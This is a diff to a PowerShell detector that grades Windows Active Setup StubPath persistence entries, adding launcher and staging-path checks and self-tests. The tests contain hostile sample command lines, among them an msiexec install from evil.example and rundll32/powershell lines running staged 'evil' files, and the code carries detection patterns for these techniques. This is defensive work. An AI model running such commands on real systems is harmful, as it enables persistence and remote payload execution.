@@ -43,15 +43,26 @@
 # (attack.mitre.org/techniques/T1547/014). Windows, Edge and Chrome all keep
 # StubPaths here, so presence is never the finding; the command is:
 #   CRITICAL strong command content (encoded PowerShell, LOLBin download-and-
-#            exec: the same list persistence_eval and startup_eval use), or a
-#            target -- the program, or the DLL a rundll32/regsvr32 line loads
-#            -- in a staging path.
+#            exec: the same list persistence_eval and startup_eval use, plus
+#            the Windows launchers url.dll FileProtocolHandler/OpenURL,
+#            shell32 ShellExec_RunDLL and msiexec from a URL), or a staging
+#            path ANYWHERE in the line -- the program, the DLL a
+#            rundll32/regsvr32 line loads, or a file handed to either.
 #   WARNING  a script host (powershell, cmd, wscript, cscript, mshta) or a
-#            script file, a target that is not validly signed, or one whose
-#            file could not be read.
-#   INFO     a target that is not on disk (a stale entry: Windows' attempt
-#            fails, nothing runs), or an entry switched off (IsInstalled=0).
-#   OK       a validly signed target outside staging paths, listed.
+#            script file; a DLL host handed a second file or path; a target
+#            that is not validly signed, or whose file could not be read; a
+#            missing target named without a folder (Windows also searches its
+#            own folder and PATH) or outside Windows and Program Files (a file
+#            placed there later runs).
+#   INFO     a missing target under Windows or Program Files (a stale entry:
+#            only an administrator could place it, nothing runs), or an entry
+#            switched off (a DWORD IsInstalled of 0).
+#   OK       a validly signed target outside staging paths, listed. Windows'
+#            own `cmd.exe /D /C start <System32 program>` entry (the
+#            ie4uinit -ClearIconCache one) is graded on the program it starts;
+#            any other cmd line stays a script host.
+#   The native Installed Components key is read through the 64-bit registry
+#   view, so a 32-bit PowerShell cannot read the Wow6432Node copy twice.
 #
 # GAPS. Absence is decided only by ItemNotFoundException (the key) or by the
 # value list (the value). A key or value that could not be read is
@@ -98,6 +109,14 @@ $script:StagingRx = '\\Temp\\|\\Downloads\\|\\Users\\Public\\|\\\$Recycle|\\Prog
 $script:ScriptHosts = @('powershell.exe', 'pwsh.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe')
 $script:ScriptExt = @('.vbs', '.vbe', '.js', '.jse', '.wsf', '.wsh', '.hta', '.ps1', '.bat', '.cmd')
 $script:DllHosts = @('rundll32.exe', 'regsvr32.exe')
+# Active Setup only: a signed Windows DLL host told to launch something else.
+# url.dll,FileProtocolHandler / OpenURL and shell32.dll,ShellExec_RunDLL run
+# whatever they are handed; msiexec installs from a URL. A Microsoft-signed
+# host is no evidence about what it is told to run (review, 2026-11-26).
+$script:LauncherContent = @('fileprotocolhandler', 'shellexec_rundll', '\bopenurl\b', 'msiexec[^\r\n]*https?:')
+# A missing target under these folders needs an administrator to drop a file
+# there, so the entry is stale; anywhere else, a file placed later runs.
+$script:AdminOnlyRx = '^[A-Za-z]:\\(Windows|Program Files|Program Files \(x86\))\\'
 $script:BootValues = @('BootExecute', 'BootExecuteNoPnpSync', 'SetupExecute', 'PlatformExecute')
 
 # Pinned shared copies (tools/lint_shared_copies.ps1): byte-identical to
@@ -275,6 +294,7 @@ function Get-NativeImagePath {
     $tok = (($e -split '\s+')[0]).Trim('"')
     if (-not $tok) { return '' }
     if ($tok -match '^\\\?\?\\') { $tok = $tok.Substring(4) }
+    if ($tok -match '^(?i)\\SystemRoot\\') { $tok = $SystemRoot.TrimEnd('\') + $tok.Substring(11) }
     if ($tok -notmatch '^[A-Za-z]:\\' -and $tok -notmatch '^\\\\') { $tok = Join-WinPath (Join-WinPath $SystemRoot 'System32') $tok }
     if ((Get-WinLeaf $tok) -notmatch '\.') { $tok = $tok + '.exe' }
     return $tok
@@ -345,13 +365,13 @@ function Get-BootReport {
 # $Exists is the file probe Get-BinPath uses for an unquoted path with spaces.
 function Get-StubTarget {
     param([string]$Stub, [scriptblock]$Exists = $null, [string]$SystemRoot = $env:SystemRoot)
-    $out = @{ Program = ''; Target = ''; Kind = 'none' }
+    $out = @{ Program = ''; Target = ''; Kind = 'none'; Relative = $false; Extra = ''; Via = '' }
     if (-not $Stub) { return $out }
     $sys32 = Join-WinPath $SystemRoot 'System32'
     $bin = Get-BinPath -Raw $Stub -Exists $Exists
     $prog = Resolve-BinPath $bin
     if (-not $prog) { return $out }
-    if ($prog -notmatch '^[A-Za-z]:\\' -and $prog -notmatch '^\\\\') { $prog = Join-WinPath $sys32 $prog }
+    if ($prog -notmatch '^[A-Za-z]:\\' -and $prog -notmatch '^\\\\') { $prog = Join-WinPath $sys32 $prog; $out.Relative = $true }
     $out.Program = $prog
     $leaf = (Get-WinLeaf $prog).ToLowerInvariant()
     if ($script:DllHosts -contains $leaf) {
@@ -364,8 +384,30 @@ function Get-StubTarget {
         if (-not $m.Success) { $m = [regex]::Match($rest, '(?:^|\s)([^\s",/]+\.(?:dll|ocx|cpl))(?=[,\s]|$)', 'IgnoreCase') }
         if ($m.Success) { $dll = Resolve-BinPath $m.Groups[1].Value }
         if ($dll -and $dll -notmatch '^[A-Za-z]:\\' -and $dll -notmatch '^\\\\') { $dll = Join-WinPath $sys32 $dll }
+        # Anything path- or file-shaped AFTER the DLL is something the host is
+        # handed to open or run (Control_RunDLL <x.cpl>, an exe argument):
+        # the signed DLL says nothing about it.
+        if ($m.Success) {
+            $after = $rest.Substring($m.Index + $m.Length)
+            $x = [regex]::Match($after, '(?i)("?[A-Za-z]:\\[^"]*|\\\\\S+|%\w+%\S*|[^\s",]+\.(exe|dll|cpl|ocx|scr|com|pif|bat|cmd|ps1|vbs|vbe|js|jse|wsf|hta|msi|lnk)\b)')
+            if ($x.Success) { $out.Extra = $x.Value.Trim() }
+        }
         $out.Kind = 'dllhost'; $out.Target = $dll
         return $out
+    }
+    # Windows' own shape: {2D46B6DC-2207-486B-B523-A557E6D54B47} runs
+    #   C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\ie4uinit.exe -ClearIconCache
+    # cmd only starts a System32 program there, so that program is graded.
+    # Only that exact shape: no other cmd syntax, the started program in
+    # System32; anything else stays a script host.
+    if ($leaf -eq 'cmd.exe' -and $Stub -notmatch '[&|<>^]') {
+        $c = [regex]::Match($Stub, '(?i)cmd(\.exe)?"?\s+/D\s+/C\s+start\s+("?)([A-Za-z%][^"\s]*\.exe)\2(\s|$)')
+        if ($c.Success) {
+            $inner = Resolve-BinPath $c.Groups[3].Value
+            if ($inner.StartsWith($sys32 + '\', [StringComparison]::OrdinalIgnoreCase) -and $inner.Substring($sys32.Length + 1) -notmatch '\\') {
+                $out.Kind = 'program'; $out.Target = $inner; $out.Via = 'cmd /D /C start'; return $out
+            }
+        }
     }
     if ($script:ScriptHosts -contains $leaf) { $out.Kind = 'scripthost'; $out.Target = $prog; return $out }
     if ($script:ScriptExt -contains ([regex]::Match($leaf, '\.[^.]*$').Value)) { $out.Kind = 'script'; $out.Target = $prog; return $out }
@@ -379,16 +421,24 @@ function Get-StubVerdict {
     $s = Get-OneLine $Stub
     $label = "Active Setup '$Component'"
     if ([string]$IsInstalled -eq '0') { return @{ Sev = 'OK'; Line = "[INFO] $label is switched off (IsInstalled=0), so Windows does not run it: $s" } }
-    foreach ($rx in $script:StrongContent) {
+    foreach ($rx in @($script:StrongContent + $script:LauncherContent)) {
         if ($s -match $rx) { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $label StubPath carries attack-shaped command content ($rx) and runs at every user's next sign-in: $s (T1547.014)" } }
     }
     $t = [string]$Target.Target
     if ($t -and $t -match $script:StagingRx) { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $label StubPath runs $t from a staging path at every user's next sign-in: $s (T1547.014)" } }
+    # The whole line, not only the program: a staged script handed to
+    # powershell -File, or a staged file handed to a DLL host, is the same.
+    $sx = $s
+    try { $sx = [Environment]::ExpandEnvironmentVariables($s) } catch {}
+    if ($sx -match $script:StagingRx) { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $label StubPath hands a file in a staging path to $(Get-WinLeaf $Target.Program) at every user's next sign-in: $s (T1547.014)" } }
     if ($Target.Kind -eq 'scripthost') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label StubPath runs a script host at every user's next sign-in: $s -- read what it runs (T1547.014)." } }
     if ($Target.Kind -eq 'script') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label StubPath runs a script file at every user's next sign-in: $s -- read what it runs (T1547.014)." } }
+    if ($Target.Kind -eq 'dllhost' -and $Target.Extra) { return @{ Sev = 'WARNING'; Line = "[WARNING] $label StubPath hands $(Get-WinLeaf $Target.Program) another file or path to open ($($Target.Extra)) at every user's next sign-in: $s -- the signed DLL says nothing about it (T1547.014)." } }
     if (-not $t) { return @{ Sev = 'WARNING'; Line = "[WARNING] $label StubPath names no file this check could resolve: $s -- read it by hand (T1547.014)." } }
     $st = [string]$Facts.State
-    if ($st -eq 'absent') { return @{ Sev = 'OK'; Line = "[INFO] $label names $t, which is not on disk -- a stale entry: Windows' attempt fails and nothing runs. ($s)" } }
+    if ($st -eq 'absent' -and $Target.Relative -and $Target.Kind -eq 'program') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label names a program without its folder, and it is not in System32: $s -- Windows also looks in its own folder and on PATH at sign-in, so a file placed there runs (T1547.014)." } }
+    if ($st -eq 'absent' -and $t -notmatch $script:AdminOnlyRx) { return @{ Sev = 'WARNING'; Line = "[WARNING] $label names $t, which is not on disk, in a folder outside Windows and Program Files: a file placed there later runs at every user's next sign-in -- a left-behind entry, or one waiting for its file: $s (T1547.014)." } }
+    if ($st -eq 'absent') { return @{ Sev = 'OK'; Line = "[INFO] $label names $t, which is not on disk -- a stale entry under a folder only an administrator can write: Windows' attempt fails and nothing runs. ($s)" } }
     if ($st -eq 'unread') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label names $t, whose file could not be read ($($Facts.Why)) -- not graded: $s (T1547.014)." } }
     if ($st -eq 'unverified') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label runs $t at every user's next sign-in, and its signature could not be verified ($($Facts.Why)): $s (T1547.014)." } }
     if ($st -ne 'signed') { return @{ Sev = 'WARNING'; Line = "[WARNING] $label runs $t at every user's next sign-in, and it is not validly signed ($($Facts.Status)): $s (T1547.014)." } }
@@ -424,6 +474,9 @@ function Get-ActiveSetupReport {
             $facts = @{ State = 'signed' }
             if ($tg.Target -and $tg.Target -notmatch $script:StagingRx -and ($tg.Kind -eq 'program' -or $tg.Kind -eq 'dllhost')) { $facts = & $Probe $tg.Target }
             $comp = if ($e.Name) { "$($e.Key) ($($e.Name))" } else { [string]$e.Key }
+            # A component name is attacker-chosen; an apostrophe in it would
+            # end the quoted label every reader of the line splits on.
+            $comp = $comp -replace "'", ''
             $x = Get-StubVerdict -Component $comp -Stub $e.Stub -IsInstalled $e.IsInstalled -Target $tg -Facts $facts
             $lines.Add($x.Line)
             if ($x.Sev -ne 'OK') { $sev = Get-MaxSev $sev $x.Sev; $hits.Add(@{ Key = (Join-WinPath $r.Root $e.Key); File = $tg.Target }) }
@@ -506,7 +559,8 @@ if ($SelfTest) {
         @('regsvr32.exe /s /n /i:U shell32.dll', 'shell32.dll'),
         @('"C:\Program Files\Windows Mail\WinMail.exe" OCInstallUserConfigOE', 'WinMail.exe'),
         @('"C:\Program Files (x86)\Microsoft\Edge\Application\131.0.2903.70\Installer\setup.exe" --configure-user-settings --verbose-logging --system-level --msedge --channel=stable', 'setup.exe'),
-        @('"C:\Program Files\Google\Chrome\Application\131.0.6778.86\Installer\chrmstp.exe" --configure-user-settings --verbose-logging --system-level', 'chrmstp.exe'))
+        @('"C:\Program Files\Google\Chrome\Application\131.0.6778.86\Installer\chrmstp.exe" --configure-user-settings --verbose-logging --system-level', 'chrmstp.exe'),
+        @('C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\ie4uinit.exe -ClearIconCache', 'ie4uinit.exe'))
     foreach ($bn in $benign) {
         $tg = Get-StubTarget -Stub $bn[0] -Exists $noFile -SystemRoot $SR
         $v = Get-StubVerdict -Component 'c' -Stub $bn[0] -IsInstalled '1' -Target $tg -Facts (& $probe $tg.Target)
@@ -538,6 +592,33 @@ if ($SelfTest) {
     T 'a DLL host with no DLL is a WARNING (nothing resolvable to grade)' ($v.Sev -eq 'WARNING' -and $v.Line -match 'names no file') $v.Line
     $tg = Get-StubTarget -Stub 'C:\Windows\System32\rundll32.exe C:\Program Files\Vendor\x y.dll,Entry' -Exists $noFile -SystemRoot $SR
     T 'an unquoted DLL path with spaces is resolved to the whole path' ($tg.Target -eq 'C:\Program Files\Vendor\x y.dll') $tg.Target
+
+    # ---- review 2026-11-26: a signed host told to run something else ----
+    foreach ($bad in @('rundll32.exe url.dll,FileProtocolHandler C:\ProgramData\x\evil.exe',
+                       'rundll32.exe shell32.dll,ShellExec_RunDLL C:\ProgramData\x\evil.exe',
+                       'msiexec.exe /q /i https://evil.example/x.msi')) {
+        $v = StubCase $bad
+        T "a Windows launcher handed another program is CRITICAL: $bad" ($v.Sev -eq 'CRITICAL') $v.Line
+    }
+    $v = StubCase ('"' + $SR + '\System32\rundll32.exe" "' + $SR + '\System32\shell32.dll",Control_RunDLL C:\Users\Public\evil.cpl')
+    T 'the CI benign twin with a staged .cpl added is CRITICAL (the whole line is checked, not only the first DLL)' ($v.Sev -eq 'CRITICAL' -and $v.Line -match 'hands a file in a staging path') $v.Line
+    $v = StubCase ('"' + $SR + '\System32\rundll32.exe" "' + $SR + '\System32\shell32.dll",Control_RunDLL C:\ProgramData\Vendor\x.cpl')
+    T 'a DLL host handed a second file outside staging is a WARNING naming it' ($v.Sev -eq 'WARNING' -and $v.Line -match 'another file or path to open \(C:\\ProgramData\\Vendor\\x\.cpl\)') $v.Line
+    $v = StubCase 'powershell.exe -NoProfile -File C:\Users\Public\x.ps1'
+    T 'a staged script handed to powershell -File is CRITICAL, not the script-host WARNING' ($v.Sev -eq 'CRITICAL') $v.Line
+    $v = StubCase 'C:\Windows\system32\cmd.exe /D /C start C:\ProgramData\x\evil.exe'
+    T 'cmd /D /C start of a program outside System32 stays the script-host WARNING (the malign twin of the ClearIconCache entry)' ($v.Sev -eq 'WARNING' -and $v.Line -match 'script host') $v.Line
+    $v = StubCase 'C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\ie4uinit.exe -ClearIconCache & C:\ProgramData\x\evil.exe'
+    T 'the ClearIconCache shape with more cmd syntax stays the script-host WARNING' ($v.Sev -eq 'WARNING' -and $v.Line -match 'script host') $v.Line
+    $v = StubCase 'C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\agent.exe'
+    T 'cmd /D /C start of an unsigned System32 program is graded on that program' ($v.Sev -eq 'WARNING' -and $v.Line -match 'agent\.exe.*not validly signed') $v.Line
+    $v = StubCase 'nohere.exe /s'
+    T 'a program named without a folder and not in System32 is a WARNING (Windows also searches its own folder and PATH), never stale' ($v.Sev -eq 'WARNING' -and $v.Line -match 'without its folder') $v.Line
+    $v = StubCase 'C:\ProgramData\Vendor\gone.exe'
+    T 'a missing target in a folder outside Windows and Program Files is a WARNING (pre-staged), never stale' ($v.Sev -eq 'WARNING' -and $v.Line -match 'a file placed there later runs') $v.Line
+    $v = StubCase 'C:\Users\Public\update.exe' 'String:0'
+    T 'a non-DWORD IsInstalled of 0 is graded as installed (here CRITICAL), never read as switched off' ($v.Sev -eq 'CRITICAL') $v.Line
+    T 'a \SystemRoot\ native path resolves under the Windows folder' ((Get-NativeImagePath 'autocheck \SystemRoot\System32\evilnat.exe' -SystemRoot 'C:\Windows') -eq 'C:\Windows\System32\evilnat.exe') (Get-NativeImagePath 'autocheck \SystemRoot\System32\evilnat.exe' -SystemRoot 'C:\Windows')
 
     $roots = @(
         @{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @('{BAD}'); Entries = @(@{ Key = '{A}'; Name = 'Windows Mail'; Stub = '"C:\Program Files\Windows Mail\WinMail.exe" OCInstallUserConfigOE'; IsInstalled = '1' }, @{ Key = '{B}'; Name = ''; Stub = ''; IsInstalled = '1' }) },
@@ -584,10 +665,23 @@ function Read-ActiveSetupRoot {
     param([string]$Root, [bool]$Required)
     $out = @{ Root = $Root; Required = $Required; State = 'ok'; Error = ''; Unread = @(); Entries = @() }
     $k = $null
-    try { $k = Get-Item -LiteralPath $Root -ErrorAction Stop }
-    catch {
-        if ($_.Exception -is [System.Management.Automation.ItemNotFoundException]) { $out.State = 'nokey'; return $out }
-        $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out
+    if ($Root -match '^(?i)HKLM:\\(.+)$') {
+        # Through the 64-bit view on a 64-bit Windows: a 32-bit PowerShell
+        # would otherwise be redirected to WOW6432Node and read that twice,
+        # never the native key, and still print the all-clear.
+        $rel = $Matches[1]
+        $view = if ([Environment]::Is64BitOperatingSystem) { [Microsoft.Win32.RegistryView]::Registry64 } else { [Microsoft.Win32.RegistryView]::Default }
+        try {
+            $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $view)
+            $k = $base.OpenSubKey($rel, $false)
+        } catch { $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out }
+        if ($null -eq $k) { $out.State = 'nokey'; return $out }
+    } else {
+        try { $k = Get-Item -LiteralPath $Root -ErrorAction Stop }
+        catch {
+            if ($_.Exception -is [System.Management.Automation.ItemNotFoundException]) { $out.State = 'nokey'; return $out }
+            $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out
+        }
     }
     $names = @()
     try { $names = @($k.GetSubKeyNames()) }
@@ -602,7 +696,15 @@ function Read-ActiveSetupRoot {
             $stub = $sk.GetValue('StubPath', $null)
             $inst = $sk.GetValue('IsInstalled', $null)
             $disp = $sk.GetValue('', $null)
-            $ents.Add(@{ Key = $n; Name = (Get-OneLine ([string]$disp)); Stub = [string]$stub; IsInstalled = $(if ($null -eq $inst) { '' } else { [string]$inst }) })
+            # Only a DWORD 0 is "switched off": Windows' own entries store
+            # IsInstalled as a DWORD. Any other type is graded as installed, and named,
+            # so a REG_SZ "0" cannot read as off while Windows runs it.
+            $iv = ''
+            if ($null -ne $inst) {
+                $ik = [string]$sk.GetValueKind('IsInstalled')
+                $iv = if ($ik -eq 'DWord') { [string]$inst } else { "${ik}:" + (@($inst) -join ' ') }
+            }
+            $ents.Add(@{ Key = $n; Name = (Get-OneLine ([string]$disp)); Stub = [string]$stub; IsInstalled = $iv })
         } catch { $unread.Add($n) }
         finally { if ($sk) { $sk.Close() } }
     }
